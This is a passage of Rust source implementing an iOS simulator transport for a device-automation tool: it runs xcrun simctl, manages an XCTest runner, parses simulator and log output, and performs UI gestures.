use std::sync::Arc;
use std::sync::Mutex as StdMutex;
use std::time::{Duration, Instant};

use anyhow::{anyhow, Context, Result};
use async_trait::async_trait;
use tokio::sync::Mutex as AsyncMutex;

use super::DeviceTransport;
use crate::driver::bootstrap as driver_bootstrap;
use crate::driver::client::{Action, ButtonKind, DriverClient, Point2D};
use crate::driver::process::LaunchedRunner;
use crate::driver::source_parse::parse_tree_hint;
use crate::driver::RUNNER_BUNDLE_ID;
use crate::network::events::NetworkEvent;
use crate::screen::ui_element::{Bounds, DeviceInfo, Point, UiElement};

static XCRUN_PATH_OVERRIDE: std::sync::OnceLock<String> = std::sync::OnceLock::new();

pub fn set_xcrun_path_override(path: String) {
    let _ = XCRUN_PATH_OVERRIDE.set(path);
}

/// Resolve the xcrun binary path. Priority: override > env > login-shell PATH > "xcrun".
pub fn resolve_xcrun() -> String {
    if let Some(p) = XCRUN_PATH_OVERRIDE.get() {
        return p.clone();
    }
    if let Ok(p) = std::env::var("DRENGR_XCRUN_PATH") {
        return p;
    }
    XCRUN_DISCOVERY.get_or_init(discover_xcrun).clone()
}

/// Same reasoning as `adb::ADB_DISCOVERY`: the answer cannot change while the
/// process runs, so it is found once instead of once per simctl call.
static XCRUN_DISCOVERY: std::sync::OnceLock<String> = std::sync::OnceLock::new();

fn discover_xcrun() -> String {
    // In-process PATH first. On a Mac with Xcode installed this ends discovery
    // with no subprocess, and on Linux it correctly finds nothing in microseconds
    // instead of paying for a login shell to tell us the same.
    if let Some(found) = super::adb::which_on_path("xcrun") {
        return found;
    }
    if let Some(path) = super::probe::login_shell("command -v xcrun") {
        return path;
    }
    "xcrun".to_string()
}

/// Every process this transport spawns is built here, so stdin is closed in one
/// place rather than five.
///
/// Our stdin is the MCP transport. `adb shell` forwarded an inherited one
/// straight to the device and ate the client's handshake; `simctl spawn` and
/// `log show` will read it too if they are handed it. Nothing here feeds a child
/// on stdin, so closing it is free and must not be left to each call site.
pub(super) fn device_process<I, S>(bin: &str, args: I) -> tokio::process::Command
where
    I: IntoIterator<Item = S>,
    S: AsRef<std::ffi::OsStr>,
{
    let mut cmd = tokio::process::Command::new(bin);
    cmd.stdin(std::process::Stdio::null()).args(args);
    cmd
}

/// iOS simulator transport. simctl handles boot/install/launch/screenshots;
/// the drengr-runner driver handles UI tree + tap/swipe/type via XCTest.
pub struct SimctlTransport {
    device_id: String,
    xcrun_bin: String,
    /// Lazily-initialized driver runner. `get_or_try_init` fixes the v0.4.1
    /// race condition where two concurrent first-callers could each spawn a
    /// runner, blowing the UdidLock for both.
    /// Cached runner, resettable so a runner that dies mid-session can be
    /// re-bootstrapped (vs. a `OnceCell` that pins a dead handle forever).
    runner: AsyncMutex<Option<Arc<LaunchedRunner>>>,
    recording: std::sync::Mutex<Option<(tokio::process::Child, String)>>,
    runner_failures: StdMutex<Vec<Instant>>,
    /// Last app we launched — the foreground bundle, passed to /observe so the
    /// runner snapshots its real element tree instead of just SpringBoard.
    last_bundle: StdMutex<Option<String>>,
}

const RUNNER_CRASH_LOOP_WINDOW: Duration = Duration::from_secs(60);
const RUNNER_CRASH_LOOP_COOLDOWN: Duration = Duration::from_secs(300);
const RUNNER_CRASH_LOOP_THRESHOLD: usize = 3;

impl SimctlTransport {
    pub fn new(device_id: impl Into<String>) -> Self {
        Self {
            device_id: device_id.into(),
            xcrun_bin: resolve_xcrun(),
            runner: AsyncMutex::new(None),
            recording: std::sync::Mutex::new(None),
            runner_failures: StdMutex::new(Vec::new()),
            last_bundle: StdMutex::new(None),
        }
    }

    /// The foreground bundle to hint to /observe: the last app we launched.
    ///
    /// Falls back to disk because every `drengr look`/`do` is its OWN PROCESS —
    /// an in-memory cache is empty by construction there, so /observe was always
    /// called with None and the runner returned SpringBoard's tree instead of the
    /// app's. Persisting it makes `do launch` → `look` work from a shell, and
    /// `--app` writes the same file for apps Drengr did not launch.
    fn foreground_bundle(&self) -> Option<String> {
        if let Some(b) = self.last_bundle.lock().ok().and_then(|g| g.clone()) {
            return Some(b);
        }
        Self::read_bundle_hint_in(&crate::paths::drengr_dir()?)
    }

    /// Where the cross-process foreground hint lives, under a given drengr dir.
    /// Pure so tests need no process-global env mutation (which races under parallelism).
    pub fn bundle_hint_path_in(dir: &std::path::Path) -> std::path::PathBuf {
        dir.join("cli").join("last_bundle")
    }

    /// Record the foreground app so a LATER process can hint /observe.
    pub fn remember_bundle_in(dir: &std::path::Path, package: &str) {
        let p = Self::bundle_hint_path_in(dir);
        if let Some(dir) = p.parent() {
            let _ = std::fs::create_dir_all(dir);
        }
        let _ = std::fs::write(p, package);
    }

    /// Read a hint written by an earlier process. None (never `Some("")`) when absent.
    pub fn read_bundle_hint_in(dir: &std::path::Path) -> Option<String> {
        std::fs::read_to_string(Self::bundle_hint_path_in(dir))
            .ok()
            .map(|s| s.trim().to_string())
            .filter(|s| !s.is_empty())
    }

    /// Record the foreground app so a LATER process can hint /observe.
    pub fn remember_bundle(package: &str) {
        let Some(dir) = crate::paths::drengr_dir() else {
            return;
        };
        Self::remember_bundle_in(&dir, package);
    }

    async fn sim_runtime_version(&self) -> Option<String> {
        let out = device_process(&self.xcrun_bin, ["simctl", "list", "-j", "devices"])
            .output()
            .await
            .ok()?;
        let json: serde_json::Value = serde_json::from_slice(&out.stdout).ok()?;
        let devices = json.get("devices")?.as_object()?;
        for (runtime, list) in devices {
            for d in list.as_array()? {
                if d.get("udid").and_then(|v| v.as_str()) == Some(&self.device_id) {
                    let pretty = runtime
                        .rsplit('.')
                        .next()
                        .unwrap_or(runtime)
                        .replace('-', " ");
                    return Some(pretty);
                }
            }
        }
        None
    }

    fn crash_loop_open(&self) -> Option<Duration> {
        let now = Instant::now();
        let mut failures = match self.runner_failures.lock() {
            Ok(g) => g,
            Err(poisoned) => poisoned.into_inner(),
        };
        failures.retain(|t| now.duration_since(*t) <= RUNNER_CRASH_LOOP_COOLDOWN);
        if failures.len() >= RUNNER_CRASH_LOOP_THRESHOLD {
            let oldest = failures.first().copied().unwrap_or(now);
            if now.duration_since(oldest) <= RUNNER_CRASH_LOOP_WINDOW {
                return Some(RUNNER_CRASH_LOOP_COOLDOWN - now.duration_since(oldest));
            }
        }
        None
    }

    fn record_runner_failure(&self) {
        if let Ok(mut g) = self.runner_failures.lock() {
            g.push(Instant::now());
        }
    }

    pub fn device_id(&self) -> &str {
        &self.device_id
    }

    /// Get (or lazily initialize) the driver runner for this device. Holds the
    /// runner mutex across bootstrap so concurrent first-callers serialize
    /// inside Tokio rather than racing on `xcodebuild test-without-building`.
    /// Self-heals: a cached runner whose process has died is dropped and
    /// re-bootstrapped instead of being handed back as a dead handle forever.
    async fn driver(&self) -> Result<Arc<LaunchedRunner>> {
        if let Some(remaining) = self.crash_loop_open() {
            return Err(anyhow!(
                "drengr-runner crash-loop detected — {} bootstrap failures inside {:?}. \
                 Cooling down for {:?}. Sim: {} (udid {}). Run `drengr build-runner` \
                 from an interactive terminal, then `drengr restart`.",
                RUNNER_CRASH_LOOP_THRESHOLD,
                RUNNER_CRASH_LOOP_WINDOW,
                remaining,
                self.sim_runtime_version()
                    .await
                    .unwrap_or_else(|| self.device_id.clone()),
                self.device_id,
            ));
        }

        let mut guard = self.runner.lock().await;

        // Reuse a cached runner only if its process is still alive. `is_alive`
        // is a local `kill(pid, 0)` syscall (microseconds, no network), so this
        // costs nothing on the hot path. A dead handle is dropped here — which
        // releases its UdidLock — so the bootstrap below can re-acquire cleanly.
        if let Some(r) = guard.as_ref() {
            if r.is_alive() {
                return Ok(r.clone());
            }
            tracing::warn!(
                "drengr-runner (pid {}) died mid-session; re-bootstrapping",
                r.pid
            );
            *guard = None;
        }

        let udid = self.device_id.clone();
        match driver_bootstrap::ensure_ready(&udid).await {
            Ok(r) => {
                let arc = Arc::new(r);
                *guard = Some(arc.clone());
                Ok(arc)
            }
            Err(e) => {
                let msg = e.to_string();
                // A session conflict means ANOTHER live Drengr process holds
                // this sim's runner lock — not a runner crash. Counting it toward
                // the crash-loop breaker turns "another instance is using the
                // sim" into a 5-minute cooldown that blocks even after the other
                // instance exits. Surface it clearly instead, and don't trip the
                // breaker (which is for genuine bootstrap/runtime failures).
                if msg.contains("driver_session_conflict") {
                    return Err(anyhow!(
                        "Another Drengr instance is already driving this simulator \
                         ({}). Close the other Claude client (Desktop/Code/Cursor) \
                         using Drengr, or run `drengr restart` in a terminal to \
                         terminate stray Drengr processes, then try again.",
                        msg
                    ));
                }
                self.record_runner_failure();
                Err(anyhow!("{}", msg))
            }
        }
    }

    async fn client(&self) -> Result<DriverClientRef> {
        let runner = self.driver().await?;
        Ok(DriverClientRef { runner })
    }

    async fn simctl_with_timeout(&self, args: &[&str], timeout_secs: u64) -> Result<Vec<u8>> {
        let mut cmd_args = vec!["simctl"];
        cmd_args.extend(args);

        let output = tokio::time::timeout(
            std::time::Duration::from_secs(timeout_secs),
            device_process(&self.xcrun_bin, &cmd_args).output(),
        )
        .await
        .context(format!("simctl timed out after {}s", timeout_secs))?
        .context("Failed to execute xcrun simctl")?;

        if !output.status.success() {
            let stderr = String::from_utf8_lossy(&output.stderr);
            anyhow::bail!("simctl failed: {}", stderr.trim());
        }

        Ok(output.stdout)
    }

    async fn simctl(&self, args: &[&str]) -> Result<Vec<u8>> {
        self.simctl_with_timeout(args, 5).await
    }

    async fn simctl_str(&self, args: &[&str]) -> Result<String> {
        let bytes = self.simctl(args).await?;
        Ok(String::from_utf8_lossy(&bytes).to_string())
    }
}

/// Holder so we can deref into `&DriverClient` while keeping the Arc alive.
struct DriverClientRef {
    runner: Arc<LaunchedRunner>,
}
impl std::ops::Deref for DriverClientRef {
    type Target = DriverClient;
    fn deref(&self) -> &Self::Target {
        &self.runner.client
    }
}

/// Pull the bundle id from a runner `tree_hint` JSON root node.
pub fn parse_bundle_id_from_tree_hint(json: &serde_json::Value) -> Option<String> {
    if !json.is_object() {
        return None;
    }
    for key in ["bundleId", "id", "identifier"] {
        if let Some(s) = json.get(key).and_then(|v| v.as_str()) {
            if !s.is_empty() && s.contains('.') {
                return Some(s.to_string());
            }
        }
    }
    None
}

/// True if the tree_hint contains any element typed `Keyboard`.
pub fn tree_hint_has_keyboard(json: &serde_json::Value) -> bool {
    if !json.is_object() {
        return false;
    }
    if json.get("type").and_then(|v| v.as_str()) == Some("Keyboard") {
        return true;
    }
    if let Some(children) = json.get("children").and_then(|v| v.as_array()) {
        for c in children {
            if tree_hint_has_keyboard(c) {
                return true;
            }
        }
    }
    false
}

/// True when `launchctl list` shows a live process for `bundle`. Rows look like
/// `31334\t0\tUIKitApplication:com.apple.mobilesafari[afaa][rb-legacy]`; a
/// terminated app has no row at all, and a loaded-but-dead job carries `-`
/// instead of a pid. The trailing `[` is required so `com.apple.mobilecal`
/// cannot match `com.apple.mobilecalendar`.
pub fn launchctl_lists_running_app(output: &str, bundle: &str) -> bool {
    let needle = format!("UIKitApplication:{}[", bundle);
    output.lines().any(|line| {
        line.contains(&needle)
            && line
                .split_whitespace()
                .next()
                .is_some_and(|pid| pid.parse::<u32>().is_ok())
    })
}

/// The alert currently on screen, as (bounds, title) from a flattened tree.
/// `parse_tree_hint` loses parent links, so alert buttons are recovered by
/// bounds containment instead.
fn find_alert(elements: &[UiElement]) -> Option<(Bounds, String)> {
    let alert = elements.iter().find(|e| e.class == "Alert")?;
    let title = if !alert.text.is_empty() {
        alert.text.clone()
    } else {
        elements
            .iter()
            .filter(|e| {
                e.class == "StaticText"
                    && !e.text.is_empty()
                    && alert
                        .bounds
                        .contains(e.bounds.center_x(), e.bounds.center_y())
            })
            .map(|e| e.text.as_str())
            .collect::<Vec<_>>()
            .join(" ")
    };
    Some((alert.bounds.clone(), title))
}

/// Centre of the first alert button whose label matches one of `labels`.
fn alert_button(elements: &[UiElement], alert: &Bounds, labels: &[&str]) -> Option<(i32, i32)> {
    elements
        .iter()
        .find(|e| {
            e.class == "Button"
                && alert.contains(e.bounds.center_x(), e.bounds.center_y())
                && labels.iter().any(|l| e.text.eq_ignore_ascii_case(l))
        })
        .map(|e| (e.bounds.center_x(), e.bounds.center_y()))
}

pub(super) const ALERT_ACCEPT_LABELS: &[&str] = &[
    "OK",
    "Allow",
    "Yes",
    "Accept",
    "Continue",
    "Confirm",
    "Agree",
    "I Agree",
    "Allow Once",
    "Allow While Using App",
    "Open",
    "Done",
];

pub(super) const ALERT_DISMISS_LABELS: &[&str] = &[
    "Cancel",
    "Deny",
    "No",
    "Dismiss",
    "Close",
    "Not Now",
    "Don't Allow",
    "Skip",
    "Later",
    "Ask App Not to Track",
];

/// Parse `xcrun simctl listapps` output. Tries JSON first (Xcode 16+),
/// falls back to plist regex scan for `<key>CFBundleIdentifier</key>...<string>`.
pub fn parse_listapps_output(text: &str) -> Vec<String> {
    parse_listapps_with_names(text)
        .into_iter()
        .map(|a| a.package)
        .collect()
}

/// Like `parse_listapps_output` but also extracts display name + kind.
pub fn parse_listapps_with_names(text: &str) -> Vec<crate::transport::AppInfo> {
    use crate::transport::{AppInfo, AppKind, NameSource};
    let mut out = Vec::new();

    if text.contains("CFBundle") {
        if let Ok(v) = serde_json::from_str::<serde_json::Value>(text) {
            if let Some(obj) = v.as_object().filter(|o| !o.is_empty()) {
                for (bid, meta) in obj {
                    // The plist name is the app's real name. Falling back to the
                    // bundle id is not a name, so it must not claim to be one.
                    let plist_name = meta
                        .get("CFBundleDisplayName")
                        .and_then(|x| x.as_str())
                        .or_else(|| meta.get("CFBundleName").and_then(|x| x.as_str()))
                        .map(str::to_string);
                    let name_source = match plist_name {
                        Some(_) => NameSource::Known,
                        None => NameSource::Derived,
                    };
                    let display_name = plist_name.unwrap_or_else(|| bid.clone());
                    let kind = match meta.get("ApplicationType").and_then(|x| x.as_str()) {
                        Some("System") => AppKind::System,
                        _ => AppKind::User,
                    };
                    out.push(AppInfo {
                        package: bid.clone(),
                        display_name,
                        kind,
                        name_source,
                    });
                }
                return out;
            }
        }
    }

    for chunk in text.split("};") {
        let bid = match find_plist_value(chunk, "CFBundleIdentifier") {
            Some(v) if v.contains('.') && !v.contains(char::is_whitespace) => v,
            _ => continue,
        };
        let plist_name = find_plist_value(chunk, "CFBundleDisplayName")
            .or_else(|| find_plist_value(chunk, "CFBundleName"));
        let name_source = match plist_name {
            Some(_) => NameSource::Known,
            None => NameSource::Derived,
        };
        let display_name = plist_name.unwrap_or_else(|| bid.clone());
        let kind = match find_plist_value(chunk, "ApplicationType").as_deref() {
            Some("System") => AppKind::System,
            _ => AppKind::User,
        };
        out.push(AppInfo {
            package: bid,
            display_name,
            kind,
            name_source,
        });
    }
    out
}

fn find_plist_value(chunk: &str, key: &str) -> Option<String> {
    if let Some(idx) = chunk.find(&format!("<key>{}</key>", key)) {
        let after = &chunk[idx..];
        if let Some(s) = after.find("<string>") {
            let tail = &after[s + "<string>".len()..];
            if let Some(e) = tail.find("</string>") {
                let v = tail[..e].trim();
                if !v.is_empty() {
                    return Some(v.to_string());
                }
            }
        }
    }
    let needle = format!("{} = ", key);
    if let Some(idx) = chunk.find(&needle) {
        let after = &chunk[idx + needle.len()..];
        let end = after.find([';', '\n']).unwrap_or(after.len());
        let raw = after[..end].trim().trim_matches('"');
        if !raw.is_empty() {
            return Some(raw.to_string());
        }
    }
    None
}

/// Parse `simctl list devices` JSON output to find booted devices.
pub fn parse_simctl_devices(json_output: &str) -> Result<Vec<(String, String)>> {
    let parsed: serde_json::Value =
        serde_json::from_str(json_output).context("Failed to parse simctl JSON")?;

    let mut devices = Vec::new();

    if let Some(device_map) = parsed.get("devices").and_then(|d| d.as_object()) {
        for (_runtime, device_list) in device_map {
            if let Some(list) = device_list.as_array() {
                for device in list {
                    let state = device.get("state").and_then(|s| s.as_str()).unwrap_or("");
                    if state == "Booted" {
                        let udid = device.get("udid").and_then(|u| u.as_str()).unwrap_or("");
                        let name = device.get("name").and_then(|n| n.as_str()).unwrap_or("");
                        if !udid.is_empty() {
                            devices.push((udid.to_string(), name.to_string()));
                        }
                    }
                }
            }
        }
    }

    Ok(devices)
}

/// Parse macOS `log show --style compact` output into LogEntry structs.
pub fn parse_os_log_lines(output: &str) -> Vec<crate::transport::LogEntry> {
    let mut entries = Vec::new();
    for line in output.lines() {
        let trimmed = line.trim();
        if trimmed.is_empty() || trimmed.starts_with("Timestamp") || trimmed.starts_with("---") {
            continue;
        }
        let parts: Vec<&str> = trimmed.splitn(5, ' ').collect();
        if parts.len() >= 5 {
            let timestamp = format!("{} {}", parts[0], parts[1]);
            let level = parts[3];
            let rest = parts[4];
            let (tag, message) = if let Some(colon_pos) = rest.find(": ") {
                (rest[..colon_pos].trim(), &rest[colon_pos + 2..])
            } else {
                ("", rest)
            };
            entries.push(crate::transport::LogEntry {
                timestamp,
                level: level.to_string(),
                tag: tag.to_string(),
                message: message.to_string(),
            });
        } else if !trimmed.is_empty() {
            entries.push(crate::transport::LogEntry {
                timestamp: String::new(),
                level: "?".to_string(),
                tag: String::new(),
                message: trimmed.to_string(),
            });
        }
    }
    entries
}

#[async_trait]
impl DeviceTransport for SimctlTransport {
    fn id(&self) -> &str {
        &self.device_id
    }

    fn platform_kind(&self) -> &'static str {
        "ios"
    }

    async fn screenshot(&self) -> Result<Vec<u8>> {
        let dir = crate::paths::drengr_dir()
            .context("HOME unset")?
            .join("tmp");
        std::fs::create_dir_all(&dir).context("create ~/.drengr/tmp")?;
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(&dir, std::fs::Permissions::from_mode(0o700))
                .context("set ~/.drengr/tmp perms")?;
        }
        let tmp = tempfile::Builder::new()
            .prefix("screenshot_")
            .suffix(".png")
            .tempfile_in(&dir)
            .context("create screenshot tempfile")?;
        let path = tmp.path().to_string_lossy().to_string();
        self.simctl_with_timeout(
            &["io", &self.device_id, "screenshot", "--type=png", &path],
            5,
        )
        .await?;
        let data = tokio::fs::read(tmp.path())
            .await
            .context("Failed to read screenshot")?;
        Ok(data)
    }

    async fn ui_tree(&self) -> Result<Vec<UiElement>> {
        let client = self.client().await?;
        let fg = self.foreground_bundle();
        if fg.is_none() {
            // Loud, because the silent version cost real debugging time: the
            // screenshot is right while the tree belongs to SpringBoard.
            tracing::warn!(
                "no foreground app known — the element tree will be SpringBoard's, not your app's. \
                 Pass --app <bundle-id>, or launch via `drengr do launch --app <bundle-id>`."
            );
        }
        let obs = client
            .observe(fg.as_deref())
            .await
            .map_err(|e| anyhow!("{}", e))?;
        Ok(parse_tree_hint(
            &obs.tree_hint.unwrap_or(serde_json::Value::Null),
        ))
    }

    /// One runner `observe()` yields screenshot + tree together — avoids the
    /// redundant `simctl io screenshot` the default `observe()` would pair with
    /// `ui_tree()`. The runner screenshot is a downscaled JPEG (built small for
    /// transport); taps are normalized / element-bounds via `screen_size`, and
    /// `annotate` measures the image to scale dots, so the lower-res image
    /// changes nothing about where actions land.
    async fn observe(&self) -> Result<crate::transport::Observation> {
        use base64::prelude::{Engine as _, BASE64_STANDARD};
        let client = self.client().await?;
        let fg = self.foreground_bundle();
        let obs = client
            .observe(fg.as_deref())
            .await
            .map_err(|e| anyhow!("{}", e))?;
        let img = BASE64_STANDARD
            .decode(obs.screenshot_b64.as_bytes())
            .map_err(|e| anyhow!("decode runner screenshot: {e}"))?;
        // A runner that answers without a tree is not the same as a screen with no
        // elements, and without this the two were identical to the caller.
        let tree_error = match &obs.tree_hint {
            Some(serde_json::Value::Null) | None => {
                tracing::warn!("runner returned no tree hint (foreground bundle: {fg:?})");
                Some("runner returned no accessibility tree".to_string())
            }
            _ => None,
        };
        let elements = parse_tree_hint(&obs.tree_hint.unwrap_or(serde_json::Value::Null));
        Ok(crate::transport::Observation {
            frame: img,
            elements,
            tree_error,
        })
    }

    async fn raw_ui_tree(&self) -> Result<String> {
        let client = self.client().await?;
        let fg = self.foreground_bundle();
        let obs = client
            .observe(fg.as_deref())
            .await
            .map_err(|e| anyhow!("{}", e))?;
        let hint = obs.tree_hint.unwrap_or(serde_json::Value::Null);
        serde_json::to_string_pretty(&hint).map_err(|e| anyhow!("serialize tree_hint: {e}"))
    }

    async fn tap(&self, x: i32, y: i32) -> Result<()> {
        let client = self.client().await?;
        client
            .act(Action::Tap {
                x: x as f64,
                y: y as f64,
            })
            .await
            .map_err(|e| anyhow!("{}", e))
    }

    async fn long_press(&self, x: i32, y: i32, duration_ms: u32) -> Result<()> {
        // Zero-length swipe at the same point = press-and-hold.
        let client = self.client().await?;
        client
            .act(Action::Swipe {
                x1: x as f64,
                y1: y as f64,
                x2: x as f64,
                y2: y as f64,
                duration_ms,
            })
            .await
            .map_err(|e| anyhow!("{}", e))
    }

    async fn swipe(&self, from: Point, to: Point, duration_ms: u32) -> Result<()> {
        let client = self.client().await?;
        client
            .act(Action::Swipe {
                x1: from.x as f64,
                y1: from.y as f64,
                x2: to.x as f64,
                y2: to.y as f64,
                duration_ms,
            })
            .await
            .map_err(|e| anyhow!("{}", e))
    }

    async fn type_text(&self, text: &str) -> Result<()> {
        // Pass the foreground app so the runner can locate its focused field;
        // the runner also tries Spotlight + springboard as fallbacks.
        let fg = self
            .current_activity()
            .await
            .ok()
            .filter(|s| s != "Unknown" && !s.is_empty());
        let client = self.client().await?;
        client
            .act(Action::Type {
                text: text.to_string(),
                bundle_id: fg,
            })
            .await
            .map_err(|e| anyhow!("{}", e))
    }

    async fn draw_path(&self, points: &[Point], duration_ms: u32) -> Result<()> {
        if points.len() < 2 {
            return Ok(());
        }
        let client = self.client().await?;
        // A single long XCUI gesture blocks the runner's main thread long enough
        // for its NWListener to suspend mid-drag, dropping the connection. Send
        // the path in short overlapping chunks (each ≤ CHUNK pts, ≤ ~900ms) so no
        // one gesture is long-lived. Chunks share an endpoint, so on a canvas the
        // strokes still connect into one continuous shape.
        const CHUNK: usize = 8;
        let total = points.len();
        let mut start = 0;
        while start + 1 < total {
            let end = (start + CHUNK).min(total - 1);
            let seg: Vec<Point2D> = points[start..=end]
                .iter()
                .map(|p| Point2D {
                    x: p.x as f64,
                    y: p.y as f64,
                })
                .collect();
            let seg_ms =
                ((duration_ms as usize) * (end - start) / (total - 1)).clamp(120, 900) as u32;
            client
                .act(Action::DrawPath {
                    points: seg,
                    duration_ms: seg_ms,
                })
                .await
                .map_err(|e| anyhow!("{}", e))?;
            start = end;
        }
        Ok(())
    }

    async fn press_key(&self, keycode: i32) -> Result<()> {
        let client = self.client().await?;
        match keycode {
            3 => client
                .act(Action::Button { button: ButtonKind::Home })
                .await
                .map_err(|e| anyhow!("{}", e)),
            // The runner wires only 'home', so sending Lock produced its internal
            // "unsupported button" error instead of telling the caller that iOS
            // has no public lock-button API to drive.
            26 => Err(anyhow!(
                "lock/power is not available on the iOS simulator: XCUITest exposes no lock button. Use Home (keycode 3), or drive the app's own UI."
            )),
            4 => {
                // BACK: iOS has no hardware back key — use the system
                // interactive left-edge swipe-back gesture (works in standard
                // UINavigationController / SwiftUI NavigationStack screens).
                let (w, h) = self.screen_size().await.unwrap_or(crate::transport::DEFAULT_SCREEN_SIZE);
                let y = (h as f64) / 2.0;
                client
                    .act(Action::Swipe {
                        x1: 2.0,
                        y1: y,
                        x2: (w as f64) * 0.7,
                        y2: y,
                        duration_ms: 250,
                    })
                    .await
                    .map_err(|e| anyhow!("{}", e))
            }
            // A key the runner cannot send must fail. Returning Ok here reported
            // "Pressed key 'enter'" to the caller while nothing happened, which
            // leaves an agent to explain a screen that never changed.
            24 | 25 => Err(anyhow!(
                "press_key({keycode}): volume buttons are not supported on iOS"
            )),
            other => Err(anyhow!(
                "press_key({other}): iOS supports only 'home' and 'back'. For text keys, type into the focused field instead."
            )),
        }
    }

    async fn launch_app(&self, package: &str) -> Result<()> {
        if !crate::validate::is_valid_package_name(package) {
            anyhow::bail!("Invalid bundle ID: {}", package);
        }
        self.simctl(&["launch", &self.device_id, package]).await?;
        // Remember the foreground app so /observe can snapshot its real tree —
        // in memory for this process, and on disk for the next CLI invocation.
        if let Ok(mut g) = self.last_bundle.lock() {
            *g = Some(package.to_string());
        }
        Self::remember_bundle(package);
        Ok(())
    }

    async fn screen_size(&self) -> Result<(u32, u32)> {
        if let Ok(client) = self.client().await {
            if let Ok(s) = client.status().await {
                return Ok((s.screen.width, s.screen.height));
            }
        }
        // Header-only dimensions via the image crate (already a dep). Robust to a
        // truncated/malformed PNG — yields the fallback instead of garbage bytes.
        let dims = match self.screenshot().await {
            Ok(png_data) => image::ImageReader::new(std::io::Cursor::new(png_data))
                .with_guessed_format()
                .ok()
                .and_then(|r| r.into_dimensions().ok()),
            Err(_) => None,
        };
        match dims {
            Some((w, h)) => {
                let scale = if w > 1200 { 3 } else { 2 };
                Ok((w / scale, h / scale))
            }
            None => Ok((390, 844)),
        }
    }

    async fn is_connected(&self) -> bool {
        self.simctl_str(&["list", "devices", "booted"])
            .await
            .map(|out| out.contains(&self.device_id))
            .unwrap_or(false)
    }

    async fn clear_focused_field(&self) -> Result<()> {
        // Send a run of delete keys to the focused field. The runner's Type
        // action calls XCUITest typeText, which maps U+0008 to the delete key.
        // Caller taps the field first; 64 deletes clears typical inputs.
        let client = self.client().await?;
        client
            .act(Action::Type {
                text: "\u{8}".repeat(64),
                bundle_id: None,
            })
            .await
            .map_err(|e| anyhow!("{}", e))
    }

    async fn current_activity(&self) -> Result<String> {
        let client = match self.client().await {
            Ok(c) => c,
            Err(_) => return Ok("Unknown".to_string()),
        };
        // None: parse the bundle from the SpringBoard snapshot (this method is
        // itself the bundle source, so it can't depend on knowing it).
        let obs = match client.observe(None).await {
            Ok(o) => o,
            Err(_) => return Ok("Unknown".to_string()),
        };
        let hint = obs.tree_hint.unwrap_or(serde_json::Value::Null);
        Ok(parse_bundle_id_from_tree_hint(&hint).unwrap_or_else(|| "Unknown".to_string()))
    }

    async fn capture_http_logs(&self) -> Result<Vec<NetworkEvent>> {
        let output = tokio::time::timeout(
            std::time::Duration::from_secs(10),
            device_process(
                "log",
                [
                    "show",
                    "--predicate",
                    "subsystem == 'com.apple.CFNetwork'",
                    "--last",
                    "5s",
                    "--style",
                    "compact",
                ],
            )
            .output(),
        )
        .await
        .ok()
        .and_then(|r| r.ok())
        .map(|o| String::from_utf8_lossy(&o.stdout).to_string())
        .unwrap_or_default();
        Ok(crate::network::logcat::parse_ios_network_log(&output))
    }

    async fn is_keyboard_visible(&self) -> Result<bool> {
        let client = self.client().await?;
        let fg = self.foreground_bundle();
        let obs = client
            .observe(fg.as_deref())
            .await
            .map_err(|e| anyhow!("{}", e))?;
        let hint = obs.tree_hint.unwrap_or(serde_json::Value::Null);
        Ok(tree_hint_has_keyboard(&hint))
    }

    async fn dismiss_keyboard(&self) -> Result<()> {
        // Returning Ok here told the caller the keyboard was gone while it was
        // still covering the screen, which is the failure the trait's own doc
        // warns about. The runner exposes no dismiss, so say so.
        anyhow::bail!(
            "dismiss_keyboard is not supported on iOS — tap outside the keyboard, or send a \
             return key into the focused field"
        )
    }

    async fn install_app(&self, path: &str) -> Result<()> {
        if !path.ends_with(".app") && !path.ends_with(".ipa") {
            anyhow::bail!("Expected .app or .ipa file, got: {}", path);
        }
        if !std::path::Path::new(path).exists() {
            anyhow::bail!("App bundle not found: {}", path);
        }
        self.simctl_with_timeout(&["install", &self.device_id, path], 120)
            .await?;
        Ok(())
    }

    async fn read_logs(
        &self,
        package: &str,
        filter: Option<&str>,
        lines: usize,
    ) -> Result<Vec<crate::transport::LogEntry>> {
        if !crate::validate::is_valid_package_name(package) {
            anyhow::bail!("Invalid package name");
        }
        let lines = lines.min(500);
        let lines_duration = (lines / 10).clamp(5, 60);

        if !crate::validate::is_valid_predicate_token(package) {
            anyhow::bail!("read_logs: package failed predicate validator");
        }
        let mut predicate = format!(
            "subsystem CONTAINS '{}' OR process CONTAINS '{}'",
            package, package
        );
        if let Some(f) = filter {
            if !crate::validate::is_valid_predicate_token(f) {
                anyhow::bail!("read_logs: filter failed predicate validator");
            }
            predicate = format!("({}) AND (eventMessage CONTAINS '{}')", predicate, f);
        }

        let output = tokio::time::timeout(
            std::time::Duration::from_secs(15),
            device_process(
                "log",
                [
                    "show",
                    "--predicate",
                    &predicate,
                    "--last",
                    &format!("{}s", lines_duration),
                    "--style",
                    "compact",
                ],
            )
            .output(),
        )
        .await
        .ok()
        .and_then(|r| r.ok())
        .map(|o| String::from_utf8_lossy(&o.stdout).to_string())
        .unwrap_or_default();

        let entries = parse_os_log_lines(&output);
        Ok(entries.into_iter().take(lines).collect())
    }

    async fn check_crash_logcat(&self, package: &str) -> Result<bool> {
        if !crate::validate::is_valid_predicate_token(package) {
            anyhow::bail!(
                "check_crash_logcat refused an invalid bundle id: {}",
                package
            );
        }
        let predicate = format!(
            "(process CONTAINS '{}') AND (eventMessage CONTAINS 'crash' OR eventMessage CONTAINS 'fatal' OR eventMessage CONTAINS 'SIGABRT' OR eventMessage CONTAINS 'EXC_BAD_ACCESS')",
            package
        );
        let run = tokio::time::timeout(
            std::time::Duration::from_secs(5),
            device_process(
                "log",
                [
                    "show",
                    "--predicate",
                    &predicate,
                    "--last",
                    "5s",
                    "--style",
                    "compact",
                ],
            )
            .output(),
        )
        .await
        .context("check_crash_logcat: `log show` did not return within 5s")?
        .context("check_crash_logcat could not run `log show`")?;
        let output = String::from_utf8_lossy(&run.stdout);
        Ok(output
            .lines()
            .any(|l| !l.trim().is_empty() && !l.starts_with("Timestamp") && !l.starts_with("---")))
    }

    async fn device_info(&self) -> Result<DeviceInfo> {
        let output = self
            .simctl_str(&["list", "devices", "booted", "-j"])
            .await?;
        let devices = parse_simctl_devices(&output)?;

        let model = devices
            .iter()
            .find(|(id, _)| id == &self.device_id)
            .map(|(_, name)| name.clone())
            .unwrap_or_else(|| "iOS Simulator".to_string());

        Ok(DeviceInfo {
